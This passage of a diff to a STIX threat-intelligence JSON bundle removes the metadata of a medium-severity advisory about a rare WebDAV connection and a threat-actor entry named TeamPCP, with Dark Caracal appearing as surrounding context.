-      "x_craftedsignal_event_id": "brief-2026-08-rare-webdav-connection",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-rare-webdav-connection/",
-      "x_craftedsignal_activity_at": "2026-08-21T13:07:51.000Z",
-      "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
       "x_craftedsignal_kev_status": "unknown"
     },
     {
@@ -43826,15 +43456,6 @@
       "created": "2025-01-01T00:00:00.000Z",
       "modified": "2025-01-01T00:00:00.000Z",
       "name": "Dark Caracal"
-    },
-    {
-      "type": "threat-actor",
-      "spec_version": "2.1",
-      "id": "threat-actor--36c38a30-dadc-52f4-89ae-7250ec4c8967",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2025-01-01T00:00:00.000Z",
-      "modified": "2025-01-01T00:00:00.000Z",
-      "name": "TeamPCP"
     },
     {
       "type": "threat-actor",
